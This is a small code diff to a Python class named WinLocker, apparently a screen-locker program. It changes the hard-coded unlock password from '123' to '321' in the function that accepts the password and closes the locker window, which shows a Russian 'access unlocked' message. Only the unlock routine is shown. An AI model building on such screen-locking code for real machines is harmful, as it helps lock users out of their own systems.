@@ -75,7 +75,7 @@ class WinLocker:
             
     def unlock(self, event=None):
         password = self.master.children['!entry'].get().strip()
-        if password == "123":
+        if password == "321":
             messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
             self.master.destroy()
         else:
